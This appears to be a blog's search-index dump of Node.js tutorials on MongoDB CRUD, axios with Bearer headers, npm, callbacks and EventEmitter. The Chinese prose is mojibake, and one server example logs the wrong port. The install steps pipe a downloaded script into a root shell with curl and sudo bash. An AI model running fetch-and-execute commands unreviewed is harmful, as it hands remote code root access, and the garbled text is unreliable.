console.log(&#x27;Connected to MongoDB&#x27;); const databaseName = &#x27;myDatabase&#x27;; const db = client.db(databaseName); console.log(`Database &#x27;$&#123;databaseName&#125;&#x27; created`); // æ’å…¥æ•°æ® const collectionName = &#x27;myCollection&#x27;; const collection = db.collection(collectionName); // æ’å…¥å•ä¸ªæ–‡æ¡£ const insertResult = await collection.insertOne(&#123; name: &#x27;m2&#x27;, age: 18, email: &#x27;m@qq.com&#x27; &#125;); // console.log(&#x27;Inserted document:&#x27;, insertResult.ops[0]); // æŸ¥è¯¢æ•°æ® const queryResult = await collection.find(&#123;&#125;).toArray(); console.log(&#x27;Query result:&#x27;, queryResult); &#125; catch (error) &#123; console.error(&#x27;Error:&#x27;, error); &#125; finally &#123; await client.close(); console.log(&#x27;Disconnected from MongoDB&#x27;); &#125;&#125;main().catch(console.error); update delete 123456789101112131415// æ›´æ–°æ•°æ®const filter = &#123; name: &#x27;m&#x27; &#125;;const update = &#123; $set: &#123; age: 15 &#125; &#125;;const updateResult = await collection.updateOne(filter, update);console.log(&#x27;Update result:&#x27;, updateResult.modifiedCount);// æŸ¥è¯¢æ•°æ®å¹¶æ‰“å°æ›´æ–°åçš„ç»“æœconst queryResult = await collection.find(&#123; name: &#x27;m&#x27; &#125;).toArray();console.log(&#x27;Query result after update:&#x27;, queryResult);// åˆ é™¤æ•°æ®const deleteResult = await collection.deleteOne(&#123; name: &#x27;m2&#x27; &#125;);console.log(&#x27;Delete result:&#x27;, deleteResult.deletedCount); asiox è¯·æ±‚ ï¼Œheaderæ·»åŠ  Authorization å€¼ä¸ºBearer xxä½¿ç”¨ Node.js å’Œ Axios å‘é€è¯·æ±‚å¹¶åœ¨è¯·æ±‚å¤´æ·»åŠ  Authorization å€¼ä¸º Bearer xx 123456789101112131415161718const axios = require(&#x27;axios&#x27;);// å®šä¹‰è¯·æ±‚çš„ URLconst url = &#x27;https://example.com/api&#x27;;// å®šä¹‰è¯·æ±‚å¤´ï¼Œæ·»åŠ  Authorization å­—æ®µconst headers = &#123; &#x27;Authorization&#x27;: &#x27;Bearer xx&#x27;&#125;;// å‘é€ GET è¯·æ±‚axios.get(url, &#123; headers &#125;) .then(response =&gt; &#123; console.log(response.data); &#125;) .catch(error =&gt; &#123; console.error(error); &#125;); é¦–å…ˆï¼Œæˆ‘ä»¬é€šè¿‡ require(â€˜axiosâ€™) å¼•å…¥ Axios åº“ï¼Œè¿™æ˜¯ä¸€ä¸ªéå¸¸æµè¡Œçš„ç”¨äºåœ¨ Node.js ä¸­å‘é€ HTTP è¯·æ±‚çš„åº“ã€‚ç„¶åï¼Œæˆ‘ä»¬å®šä¹‰äº†è¯·æ±‚çš„ urlï¼Œè¿™é‡Œçš„ https://example.com/api æ˜¯ä¸€ä¸ªç¤ºä¾‹çš„ API ç«¯ç‚¹ï¼Œå¯ä»¥å°†å…¶æ›¿æ¢ä¸ºå®é™…è¦è¯·æ±‚çš„åœ°å€ã€‚æ¥ç€ï¼Œæˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ª headers å¯¹è±¡ï¼Œå…¶ä¸­åŒ…å« Authorization å­—æ®µï¼Œå…¶å€¼ä¸º Bearer xxã€‚Bearer é€šå¸¸ç”¨äºä¼ é€’è®¿é—®ä»¤ç‰Œï¼ˆtokenï¼‰ï¼Œå¯ä»¥å°† xx æ›¿æ¢ä¸ºçš„å®é™…ä»¤ç‰Œã€‚æœ€åï¼Œæˆ‘ä»¬ä½¿ç”¨ axios.get(url, { headers }) å‘é€ä¸€ä¸ª GET è¯·æ±‚ã€‚ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è¯·æ±‚çš„ URLï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¸€ä¸ªé…ç½®å¯¹è±¡ï¼Œå…¶ä¸­åŒ…å«æˆ‘ä»¬å®šä¹‰çš„ headersã€‚.then() æ–¹æ³•å¤„ç†è¯·æ±‚æˆåŠŸçš„æƒ…å†µï¼Œå®ƒæ¥æ”¶æœåŠ¡å™¨è¿”å›çš„æ•°æ®å¹¶å°†å…¶æ‰“å°åˆ°æ§åˆ¶å°ã€‚.catch() æ–¹æ³•å¤„ç†è¯·æ±‚å¤±è´¥çš„æƒ…å†µï¼Œå®ƒæ¥æ”¶é”™è¯¯å¯¹è±¡å¹¶å°†é”™è¯¯ä¿¡æ¯æ‰“å°åˆ°æ§åˆ¶å°ã€‚å¦‚æœéœ€è¦å‘é€ POST è¯·æ±‚ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹ä»£ç ï¼š 1234567891011121314151617181920212223const axios = require(&#x27;axios&#x27;);// å®šä¹‰è¯·æ±‚çš„ URLconst url = &#x27;https://example.com/api&#x27;;// å®šä¹‰è¯·æ±‚å¤´ï¼Œæ·»åŠ  Authorization å­—æ®µconst headers = &#123; &#x27;Authorization&#x27;: &#x27;Bearer xx&#x27;&#125;;// è¦å‘é€çš„æ•°æ®const data = &#123; key: &#x27;value&#x27;&#125;;// å‘é€ POST è¯·æ±‚axios.post(url, data, &#123; headers &#125;) .then(response =&gt; &#123; console.log(response.data); &#125;) .catch(error =&gt; &#123; console.error(error); &#125;); ä¸ GET è¯·æ±‚ç±»ä¼¼ï¼Œä½†æˆ‘ä»¬ä½¿ç”¨ axios.post(url, data, { headers }) å‘é€ POST è¯·æ±‚ã€‚è¿™é‡Œçš„ data æ˜¯è¦å‘é€çš„æ•°æ®ï¼Œå®ƒå¯ä»¥æ˜¯ä¸€ä¸ªå¯¹è±¡ã€æ•°ç»„æˆ–å…¶ä»–æ•°æ®ç±»å‹ã€‚åŒæ ·ï¼Œheaders åŒ…å« Authorization ä¿¡æ¯ï¼Œurl æ˜¯è¯·æ±‚çš„åœ°å€ã€‚ å¯¹äº PUT è¯·æ±‚ï¼Œä½¿ç”¨ axios.put(url, data, { headers })ã€‚å¯¹äº DELETE è¯·æ±‚ï¼Œä½¿ç”¨ axios.delete(url, { headers })ã€‚ End","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"Node.js","slug":"Node-js","permalink":"https://banjinmei.github.io/tags/Node-js/"},{"name":"util","slug":"util","permalink":"https://banjinmei.github.io/tags/util/"},{"name":"file","slug":"file","permalink":"https://banjinmei.github.io/tags/file/"},{"name":"getpost","slug":"getpost","permalink":"https://banjinmei.github.io/tags/getpost/"},{"name":"web","slug":"web","permalink":"https://banjinmei.github.io/tags/web/"},{"name":"express","slug":"express","permalink":"https://banjinmei.github.io/tags/express/"},{"name":"child_process","slug":"child-process","permalink":"https://banjinmei.github.io/tags/child-process/"},{"name":"mogodb","slug":"mogodb","permalink":"https://banjinmei.github.io/tags/mogodb/"}],"author":"mu"},{"title":"Nodejs base","slug":"Nodejs-Base","date":"2024-05-17T11:00:03.000Z","updated":"2024-12-02T17:11:50.901Z","comments":true,"path":"2024/05/17/Nodejs-Base/","permalink":"https://banjinmei.github.io/2024/05/17/Nodejs-Base/","excerpt":"","text":"ç®€å•çš„è¯´ Node.js å°±æ˜¯è¿è¡Œåœ¨æœåŠ¡ç«¯çš„ JavaScriptã€‚ Node.js æ˜¯ä¸€ä¸ªåŸºäº Chrome JavaScript è¿è¡Œæ—¶å»ºç«‹çš„ä¸€ä¸ªå¹³å°ã€‚ Node.js æ˜¯ä¸€ä¸ªäº‹ä»¶é©±åŠ¨ I&#x2F;O æœåŠ¡ç«¯ JavaScript ç¯å¢ƒï¼ŒåŸºäº Google çš„ V8 å¼•æ“ï¼ŒV8 å¼•æ“æ‰§è¡Œ Javascript çš„é€Ÿåº¦éå¸¸å¿«ï¼Œæ€§èƒ½éå¸¸å¥½ã€‚ ğŸ› Node.jså®‰è£… Node.jså®‰è£…åœ¨ä¸Šä¸€ç¯‡æ–‡ç« Debian Node.js HEXO æœ‰è®²åˆ° æˆªè‡³ç›®å‰æœ€æ–°çš„ç‰ˆæœ¬æ˜¯20.12.2 #æŸ¥çœ‹ç‰ˆæœ¬ node -v v20.12.2 winä¸‹å¯ä»¥åœ¨å®˜ç½‘ä¸‹è½½å®‰è£… https://nodejs.org/en/download debian nodejsnode 14ç‰ˆæœ¬ 1$ apt-get update 1$ curl -fsSL https://deb.nodesource.com/setup_14.x | sudo -E bash - #å¦‚æœæç¤ºsudo å‘½ä»¤æ²¡æœ‰æ‰¾åˆ°ï¼Œä¸€å®šè¦ä¸‹è½½ï¼Œæ‰§è¡Œapt-get install sudo -y å³å¯ï¼Œç„¶åå†æ‰§è¡Œä¸Šè¿°å‘½ä»¤ 1$ apt-get install nodejs -y 1$ node --version //éªŒè¯å½“ç„¶å¦‚æœéœ€è¦å®‰è£…node20ç‰ˆæœ¬ï¼Œåªéœ€å°†ä¸Šè¿°å‘½ä»¤æ›¿æ¢ä¸ºï¼š 1$ curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash - ğŸ’¬helloworld hi.js 1console.log(&quot;hello world node.js &quot;) // like javascript~ node hi.js [20240504n11] ğŸ‘©â€ğŸ«Node.js åˆ›å»ºç¬¬ä¸€ä¸ªåº”ç”¨require æŒ‡ä»¤ 1var http = require(&quot;http&quot;); åˆ›å»ºæœåŠ¡å™¨&#x2F;æ¥æ”¶å“åº”è¯·æ±‚ 1234567891011121314151617var http = require(&#x27;http&#x27;);http.createServer(function (request, response) &#123; // å‘é€ HTTP å¤´éƒ¨ // HTTP çŠ¶æ€å€¼: 200 : OK // å†…å®¹ç±»å‹: text/plain response.writeHead(200, &#123;&#x27;Content-Type&#x27;: &#x27;text/plain&#x27;&#125;); // å‘é€å“åº”æ•°æ® &quot;Hello World&quot; response.end(&#x27;Hello World\\n&#x27;);&#125;).listen(8888);// ç»ˆç«¯æ‰“å°å¦‚ä¸‹ä¿¡æ¯console.log(&#x27;Server running at http://127.0.0.1:1200/&#x27;); ğŸš€npmä½¿ç”¨ npm æ˜¯åŒ…ç®¡ç†å·¥å…· å…è®¸ç”¨æˆ·ä»NPMæœåŠ¡å™¨ä¸‹è½½åˆ«äººç¼–å†™çš„ç¬¬ä¸‰æ–¹åŒ…åˆ°æœ¬åœ°ä½¿ç”¨ã€‚ å…è®¸ç”¨æˆ·ä»NPMæœåŠ¡å™¨ä¸‹è½½å¹¶å®‰è£…åˆ«äººç¼–å†™çš„å‘½ä»¤è¡Œç¨‹åºåˆ°æœ¬åœ°ä½¿ç”¨ã€‚ å…è®¸ç”¨æˆ·å°†è‡ªå·±ç¼–å†™çš„åŒ…æˆ–å‘½ä»¤è¡Œç¨‹åºä¸Šä¼ åˆ°NPMæœåŠ¡å™¨ä¾›åˆ«äººä½¿ç”¨ã€‚ npm -v å¦‚æœä½ å®‰è£…çš„æ˜¯æ—§ç‰ˆæœ¬çš„ npmï¼Œå¯ä»¥å¾ˆå®¹æ˜“å¾—é€šè¿‡ npm å‘½ä»¤æ¥å‡çº§ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š $ sudo npm install npm -g &#x2F;usr&#x2F;local&#x2F;bin&#x2F;npm -&gt; &#x2F;usr&#x2F;local&#x2F;lib&#x2F;node_modules&#x2F;npm&#x2F;bin&#x2F;npm-cli.js &#110;&#112;&#x6d;&#64;&#x32;&#46;&#49;&#x34;&#x2e;&#x32; &#x2F;usr&#x2F;local&#x2F;lib&#x2F;node_modules&#x2F;npm å¦‚æœæ˜¯ Window ç³»ç»Ÿä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å³å¯ï¼š npm install npm -g ä½¿ç”¨æ·˜å®é•œåƒçš„å‘½ä»¤ï¼š npm install -g cnpm â€“registry&#x3D;https://registry.npmmirror.com å…¨å±€å®‰è£…ä¸æœ¬åœ°å®‰è£… npm çš„åŒ…å®‰è£…åˆ†ä¸ºæœ¬åœ°å®‰è£…ï¼ˆlocalï¼‰ã€å…¨å±€å®‰è£…ï¼ˆglobalï¼‰ä¸¤ç§ï¼Œä»æ•²çš„å‘½ä»¤è¡Œæ¥çœ‹ï¼Œå·®åˆ«åªæ˜¯æœ‰æ²¡æœ‰-gè€Œå·²ï¼Œæ¯”å¦‚ npm install express # æœ¬åœ°å®‰è£… npm install express -g # å…¨å±€å®‰è£… å¦‚æœå‡ºç°ä»¥ä¸‹é”™è¯¯ï¼š npm err! Error: connect ECONNREFUSED 127.0.0.1:8087 è§£å†³åŠæ³•ä¸ºï¼š $ npm config set proxy null æŸ¥çœ‹å®‰è£…ä¿¡æ¯ npm list â”€â”€ &#x65;&#120;&#112;&#x72;&#101;&#115;&#x73;&#64;&#x34;&#46;&#x31;&#57;&#46;&#50; npm list -g ä½¿ç”¨package.json -node_modules&#x2F;express&#x2F;package.json å†…å®¹ï¼š Package.json å±æ€§è¯´æ˜ name - åŒ…åã€‚ version - åŒ…çš„ç‰ˆæœ¬å·ã€‚ description - åŒ…çš„æè¿°ã€‚ homepage - åŒ…çš„å®˜ç½‘ url ã€‚ author - åŒ…çš„ä½œè€…å§“åã€‚ contributors - åŒ…çš„å…¶ä»–è´¡çŒ®è€…å§“åã€‚ dependencies - ä¾èµ–åŒ…åˆ—è¡¨ã€‚å¦‚æœä¾èµ–åŒ…æ²¡æœ‰å®‰è£…ï¼Œnpm ä¼šè‡ªåŠ¨å°†ä¾èµ–åŒ…å®‰è£…åœ¨ node_module ç›®å½•ä¸‹ã€‚ repository - åŒ…ä»£ç å­˜æ”¾çš„åœ°æ–¹çš„ç±»å‹ï¼Œå¯ä»¥æ˜¯ git æˆ– svnï¼Œgit å¯åœ¨ Github ä¸Šã€‚ main - main å­—æ®µæŒ‡å®šäº†ç¨‹åºçš„ä¸»å…¥å£æ–‡ä»¶ï¼Œrequire(â€˜moduleNameâ€™) å°±ä¼šåŠ è½½è¿™ä¸ªæ–‡ä»¶ã€‚è¿™ä¸ªå­—æ®µçš„é»˜è®¤å€¼æ˜¯æ¨¡å—æ ¹ç›®å½•ä¸‹é¢çš„ index.jsã€‚ keywords - å…³é”®å­— å¸è½½ 12npm uninstall expressnpm ls æ›´æ–° 12npm update express åˆ›å»º 1npm init This utility will walk you through creating a package.json file. It only covers the most common items, and tries to guess sensible defaults. See npm help json for definitive documentation on these fields and exactly what they do. Use npm install &lt;pkg&gt; --save afterwards to install a package and save it as a dependency in the package.json file. Press ^C at any time to quit. name: (node_modules) runoob # æ¨¡å—å version: (1.0.0) description: Node.js æµ‹è¯•æ¨¡å—(www.runoob.com) # æè¿° entry point: (index.js) test command: make test git repository: https://github.com/runoob/runoob.git # Github åœ°å€ keywords: author: license: (ISC) About to write to â€¦â€¦&#x2F;node_modules&#x2F;package.json: # ç”Ÿæˆåœ°å€ { â€œnameâ€: â€œrunoobâ€, â€œversionâ€: â€œ1.0.0â€, â€œdescriptionâ€: â€œNode.js æµ‹è¯•æ¨¡å—(www.runoob.com)â€, â€¦â€¦ } Is this ok? (yes) yes yesåä¼šç”Ÿæˆ package.json npm adduser Username: mcmohd Password: Email: (this IS public) &#109;&#x63;&#109;&#x6f;&#104;&#100;&#x40;&#103;&#109;&#97;&#105;&#x6c;&#46;&#x63;&#x6f;&#109; å‘å¸ƒ npm publish å°±å¯ä»¥è·Ÿå…¶ä»–æ¨¡å—ä¸€æ ·ä½¿ç”¨ npm æ¥å®‰è£… ğŸ”­Node.js å›è°ƒå‡½æ•° Node.js å¼‚æ­¥ç¼–ç¨‹çš„ç›´æ¥ä½“ç°å°±æ˜¯å›è°ƒã€‚ å¼‚æ­¥ç¼–ç¨‹ä¾æ‰˜äºå›è°ƒæ¥å®ç°ï¼Œä½†ä¸èƒ½è¯´ä½¿ç”¨äº†å›è°ƒåç¨‹åºå°±å¼‚æ­¥åŒ–äº†ã€‚ å›è°ƒå‡½æ•°åœ¨å®Œæˆä»»åŠ¡åå°±ä¼šè¢«è°ƒç”¨ï¼ŒNode ä½¿ç”¨äº†å¤§é‡çš„å›è°ƒå‡½æ•°ï¼ŒNode æ‰€æœ‰ API éƒ½æ”¯æŒå›è°ƒå‡½æ•°ã€‚ ä¾‹å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥ä¸€è¾¹è¯»å–æ–‡ä»¶ï¼Œä¸€è¾¹æ‰§è¡Œå…¶ä»–å‘½ä»¤ï¼Œåœ¨æ–‡ä»¶è¯»å–å®Œæˆåï¼Œæˆ‘ä»¬å°†æ–‡ä»¶å†…å®¹ä½œä¸ºå›è°ƒå‡½æ•°çš„å‚æ•°è¿”å›ã€‚è¿™æ ·åœ¨æ‰§è¡Œä»£ç æ—¶å°±æ²¡æœ‰é˜»å¡æˆ–ç­‰å¾…æ–‡ä»¶ I&#x2F;O æ“ä½œã€‚è¿™å°±å¤§å¤§æé«˜äº† Node.js çš„æ€§èƒ½ï¼Œå¯ä»¥å¤„ç†å¤§é‡çš„å¹¶å‘è¯·æ±‚ã€‚ å›è°ƒå‡½æ•°ä¸€èˆ¬ä½œä¸ºå‡½æ•°çš„æœ€åä¸€ä¸ªå‚æ•°å‡ºç°ï¼š 12function foo1(name, age, callback) &#123; &#125;function foo2(value, callback1, callback2) &#123; &#125; é˜»å¡ä»£ç å®ä¾‹ åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ x.txt ï¼Œå†…å®¹å¦‚ä¸‹ï¼š hi hi hi åˆ›å»º main.js æ–‡ä»¶, ä»£ç å¦‚ä¸‹ï¼š 1234567var fs = require(&quot;fs&quot;);var data = fs.readFileSync(&#x27;x.txt&#x27;);console.log(data.toString());console.log(&quot;ç¨‹åºæ‰§è¡Œç»“æŸ!&quot;); ä»¥ä¸Šä»£ç æ‰§è¡Œç»“æœå¦‚ä¸‹ï¼š node main.js hi hi hi ç¨‹åºæ‰§è¡Œç»“æŸ! éé˜»å¡ä»£ç å®ä¾‹ åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ input.txt ï¼Œå†…å®¹å¦‚ä¸‹ï¼š èœé¸Ÿæ•™ç¨‹å®˜ç½‘åœ°å€ï¼šwww.runoob.com åˆ›å»º main.js æ–‡ä»¶, ä»£ç å¦‚ä¸‹ï¼š 12345678var fs = require(&quot;fs&quot;);fs.readFile(&#x27;input.txt&#x27;, function (err, data) &#123; if (err) return console.error(err); console.log(data.toString());&#125;);console.log(&quot;ç¨‹åºæ‰§è¡Œç»“æŸ!&quot;); ä»¥ä¸Šä»£ç æ‰§è¡Œç»“æœå¦‚ä¸‹ï¼š node main.js ç¨‹åºæ‰§è¡Œç»“æŸ! hi hi hi ä»¥ä¸Šä¸¤ä¸ªå®ä¾‹æˆ‘ä»¬äº†è§£äº†é˜»å¡ä¸éé˜»å¡è°ƒç”¨çš„ä¸åŒã€‚ç¬¬ä¸€ä¸ªå®ä¾‹åœ¨æ–‡ä»¶è¯»å–å®Œåæ‰æ‰§è¡Œç¨‹åºã€‚ ç¬¬äºŒä¸ªå®ä¾‹æˆ‘ä»¬ä¸éœ€è¦ç­‰å¾…æ–‡ä»¶è¯»å–å®Œï¼Œè¿™æ ·å°±å¯ä»¥åœ¨è¯»å–æ–‡ä»¶æ—¶åŒæ—¶æ‰§è¡Œæ¥ä¸‹æ¥çš„ä»£ç ï¼Œå¤§å¤§æé«˜äº†ç¨‹åºçš„æ€§èƒ½ã€‚ å› æ­¤ï¼Œé˜»å¡æ˜¯æŒ‰é¡ºåºæ‰§è¡Œçš„ï¼Œè€Œéé˜»å¡æ˜¯ä¸éœ€è¦æŒ‰é¡ºåºçš„ï¼Œæ‰€ä»¥å¦‚æœéœ€è¦å¤„ç†å›è°ƒå‡½æ•°çš„å‚æ•°ï¼Œæˆ‘ä»¬å°±éœ€è¦å†™åœ¨å›è°ƒå‡½æ•°å†…ã€‚ ğŸNode.js äº‹ä»¶å¾ªç¯ Node.js æ˜¯å•è¿›ç¨‹å•çº¿ç¨‹åº”ç”¨ç¨‹åºï¼Œä½†æ˜¯å› ä¸º V8 å¼•æ“æä¾›çš„å¼‚æ­¥æ‰§è¡Œå›è°ƒæ¥å£ï¼Œé€šè¿‡è¿™äº›æ¥å£å¯ä»¥å¤„ç†å¤§é‡çš„å¹¶å‘ï¼Œæ‰€ä»¥æ€§èƒ½éå¸¸é«˜ã€‚ Node.js å‡ ä¹æ¯ä¸€ä¸ª API éƒ½æ˜¯æ”¯æŒå›è°ƒå‡½æ•°çš„ã€‚ Node.js åŸºæœ¬ä¸Šæ‰€æœ‰çš„äº‹ä»¶æœºåˆ¶éƒ½æ˜¯ç”¨è®¾è®¡æ¨¡å¼ä¸­è§‚å¯Ÿè€…æ¨¡å¼å®ç°ã€‚ Node.js å•çº¿ç¨‹ç±»ä¼¼è¿›å…¥ä¸€ä¸ªwhile(true)çš„äº‹ä»¶å¾ªç¯ï¼Œç›´åˆ°æ²¡æœ‰äº‹ä»¶è§‚å¯Ÿè€…é€€å‡ºï¼Œæ¯ä¸ªå¼‚æ­¥äº‹ä»¶éƒ½ç”Ÿæˆä¸€ä¸ªäº‹ä»¶è§‚å¯Ÿè€…ï¼Œå¦‚æœæœ‰äº‹ä»¶å‘ç”Ÿå°±è°ƒç”¨è¯¥å›è°ƒå‡½æ•°. äº‹ä»¶é©±åŠ¨ç¨‹åº Node.js ä½¿ç”¨äº‹ä»¶é©±åŠ¨æ¨¡å‹ï¼Œå½“web serveræ¥æ”¶åˆ°è¯·æ±‚ï¼Œå°±æŠŠå®ƒå…³é—­ç„¶åè¿›è¡Œå¤„ç†ï¼Œç„¶åå»æœåŠ¡ä¸‹ä¸€ä¸ªwebè¯·æ±‚ã€‚ å½“è¿™ä¸ªè¯·æ±‚å®Œæˆï¼Œå®ƒè¢«æ”¾å›å¤„ç†é˜Ÿåˆ—ï¼Œå½“åˆ°è¾¾é˜Ÿåˆ—å¼€å¤´ï¼Œè¿™ä¸ªç»“æœè¢«è¿”å›ç»™ç”¨æˆ·ã€‚ è¿™ä¸ªæ¨¡å‹éå¸¸é«˜æ•ˆå¯æ‰©å±•æ€§éå¸¸å¼ºï¼Œå› ä¸º webserver ä¸€ç›´æ¥å—è¯·æ±‚è€Œä¸ç­‰å¾…ä»»ä½•è¯»å†™æ“ä½œã€‚ï¼ˆè¿™ä¹Ÿç§°ä¹‹ä¸ºéé˜»å¡å¼IOæˆ–è€…äº‹ä»¶é©±åŠ¨IOï¼‰ åœ¨äº‹ä»¶é©±åŠ¨æ¨¡å‹ä¸­ï¼Œä¼šç”Ÿæˆä¸€ä¸ªä¸»å¾ªç¯æ¥ç›‘å¬äº‹ä»¶ï¼Œå½“æ£€æµ‹åˆ°äº‹ä»¶æ—¶è§¦å‘å›è°ƒå‡½æ•°ã€‚ EventEmitters -&gt; Events &#x3D;&gt;&lt;&#x3D; EventLoop -&gt; Event Handlers æ•´ä¸ªäº‹ä»¶é©±åŠ¨çš„æµç¨‹å°±æ˜¯è¿™ä¹ˆå®ç°çš„ï¼Œéå¸¸ç®€æ´ã€‚æœ‰ç‚¹ç±»ä¼¼äºè§‚å¯Ÿè€…æ¨¡å¼ï¼Œäº‹ä»¶ç›¸å½“äºä¸€ä¸ªä¸»é¢˜(Subject)ï¼Œè€Œæ‰€æœ‰æ³¨å†Œåˆ°è¿™ä¸ªäº‹ä»¶ä¸Šçš„å¤„ç†å‡½æ•°ç›¸å½“äºè§‚å¯Ÿè€…(Observer)ã€‚ Node.js æœ‰å¤šä¸ªå†…ç½®çš„äº‹ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å¼•å…¥ events æ¨¡å—ï¼Œå¹¶é€šè¿‡å®ä¾‹åŒ– EventEmitter ç±»æ¥ç»‘å®šå’Œç›‘å¬äº‹ä»¶ï¼Œå¦‚ä¸‹å®ä¾‹ï¼š 1234// å¼•å…¥ events æ¨¡å—var events = require(&#x27;events&#x27;);// åˆ›å»º eventEmitter å¯¹è±¡var eventEmitter = new events.EventEmitter(); ä»¥ä¸‹ç¨‹åºç»‘å®šäº‹ä»¶å¤„ç†ç¨‹åºï¼š 12// ç»‘å®šäº‹ä»¶åŠäº‹ä»¶çš„å¤„ç†ç¨‹åºeventEmitter.on(&#x27;eventName&#x27;, eventHandler); æˆ‘ä»¬å¯ä»¥é€šè¿‡ç¨‹åºè§¦å‘äº‹ä»¶ï¼š 12// è§¦å‘äº‹ä»¶eventEmitter.emit(&#x27;eventName&#x27;); main.js 1234567891011121314151617181920212223242526// å¼•å…¥ events æ¨¡å—var events = require(&#x27;events&#x27;);// åˆ›å»º eventEmitter å¯¹è±¡var eventEmitter = new events.EventEmitter();// åˆ›å»ºäº‹ä»¶å¤„ç†ç¨‹åºvar connectHandler = function connected() &#123; console.log(&#x27;è¿æ¥æˆåŠŸã€‚&#x27;); // è§¦å‘ data_received äº‹ä»¶ eventEmitter.emit(&#x27;data_received&#x27;);&#125;// ç»‘å®š connection äº‹ä»¶å¤„ç†ç¨‹åºeventEmitter.on(&#x27;connection&#x27;, connectHandler);// ä½¿ç”¨åŒ¿åå‡½æ•°ç»‘å®š data_received äº‹ä»¶eventEmitter.on(&#x27;data_received&#x27;, function()&#123; console.log(&#x27;æ•°æ®æ¥æ”¶æˆåŠŸã€‚&#x27;);&#125;);// è§¦å‘ connection äº‹ä»¶ eventEmitter.emit(&#x27;connection&#x27;);console.log(&quot;ç¨‹åºæ‰§è¡Œå®Œæ¯•ã€‚&quot;); connection -&gt; connectHandler -&gt; data_received 12345node main.jsè¿æ¥æˆåŠŸã€‚æ•°æ®æ¥æ”¶æˆåŠŸã€‚ç¨‹åºæ‰§è¡Œå®Œæ¯•ã€‚ Node åº”ç”¨ç¨‹åºæ˜¯å¦‚ä½•å·¥ä½œçš„ï¼Ÿ åœ¨ Node åº”ç”¨ç¨‹åºä¸­ï¼Œæ‰§è¡Œå¼‚æ­¥æ“ä½œçš„å‡½æ•°å°†å›è°ƒå‡½æ•°ä½œä¸ºæœ€åä¸€ä¸ªå‚æ•°ï¼Œ å›è°ƒå‡½æ•°æ¥æ”¶é”™è¯¯å¯¹è±¡ä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°ã€‚ æ¥ä¸‹æ¥è®©æˆ‘ä»¬æ¥é‡æ–°çœ‹ä¸‹å‰é¢çš„å®ä¾‹ï¼Œåˆ›å»ºä¸€ä¸ª x.txt ,æ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š 123456789101112//main.jsvar fs = require(&quot;fs&quot;);fs.readFile(&#x27;x.txt&#x27;, function (err, data) &#123; if (err)&#123; console.log(err.stack); return; &#125; console.log(data.toString());&#125;);console.log(&quot;ç¨‹åºæ‰§è¡Œå®Œæ¯•&quot;); æ‰§è¡Œ åˆ™å¼‚æ­¥è¯»å–x.txtå†…å®¹ æŠŠè·¯åŠ²æ”¹æˆ x1.txtè¯»å–é”™è¯¯åˆ™log é”™è¯¯å†…å®¹ ğŸ“”Node.js EventEmitter Node.js æ‰€æœ‰çš„å¼‚æ­¥ I&#x2F;O æ“ä½œåœ¨å®Œæˆæ—¶éƒ½ä¼šå‘é€ä¸€ä¸ªäº‹ä»¶åˆ°äº‹ä»¶é˜Ÿåˆ—ã€‚ Node.js é‡Œé¢çš„è®¸å¤šå¯¹è±¡éƒ½ä¼šåˆ†å‘äº‹ä»¶ï¼šä¸€ä¸ª net.Server å¯¹è±¡ä¼šåœ¨æ¯æ¬¡æœ‰æ–°è¿æ¥æ—¶è§¦å‘ä¸€ä¸ªäº‹ä»¶ï¼Œ ä¸€ä¸ª fs.readStream å¯¹è±¡ä¼šåœ¨æ–‡ä»¶è¢«æ‰“å¼€çš„æ—¶å€™è§¦å‘ä¸€ä¸ªäº‹ä»¶ã€‚ æ‰€æœ‰è¿™äº›äº§ç”Ÿäº‹ä»¶çš„å¯¹è±¡éƒ½æ˜¯ events.EventEmitter çš„å®ä¾‹ã€‚ 123456789//main.js æ–‡ä»¶var EventEmitter = require(&#x27;events&#x27;).EventEmitter; var event = new EventEmitter(); event.on(&#x27;some_event&#x27;, function() &#123; console.log(&#x27;some_event äº‹ä»¶è§¦å‘&#x27;); &#125;); setTimeout(function() &#123; event.emit(&#x27;some_event&#x27;); &#125;, 10000); 10såæ‰§è¡Œ some_event è¾“å‡º äº‹ä»¶è§¦å‘ EventEmitter çš„æ¯ä¸ªäº‹ä»¶ç”±ä¸€ä¸ªäº‹ä»¶åå’Œè‹¥å¹²ä¸ªå‚æ•°ç»„æˆï¼Œäº‹ä»¶åæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œé€šå¸¸è¡¨è¾¾ä¸€å®šçš„è¯­ä¹‰ã€‚å¯¹äºæ¯ä¸ªäº‹ä»¶ï¼ŒEventEmitter æ”¯æŒ è‹¥å¹²ä¸ªäº‹ä»¶ç›‘å¬å™¨ã€‚ å½“äº‹ä»¶è§¦å‘æ—¶ï¼Œæ³¨å†Œåˆ°è¿™ä¸ªäº‹ä»¶çš„äº‹ä»¶ç›‘å¬å™¨è¢«ä¾æ¬¡è°ƒç”¨ï¼Œäº‹ä»¶å‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°å‚æ•°ä¼ é€’ã€‚ 1234567891011//main.js æ–‡ä»¶var events = require(&#x27;events&#x27;); var emitter = new events.EventEmitter(); emitter.on(&#x27;someEvent&#x27;, function(arg1, arg2) &#123; console.log(&#x27;listener1&#x27;, arg1, arg2); &#125;); emitter.on(&#x27;someEvent&#x27;, function(arg1, arg2) &#123; console.log(&#x27;listener2&#x27;, arg1, arg2); &#125;); emitter.emit(&#x27;someEvent&#x27;, &#x27;arg1 å‚æ•°&#x27;, &#x27;arg2 å‚æ•°&#x27;); emitter ä¸ºäº‹ä»¶ someEvent æ³¨å†Œäº†ä¸¤ä¸ªäº‹ä»¶ç›‘å¬å™¨ï¼Œç„¶åè§¦å‘äº† someEvent äº‹ä»¶ã€‚ 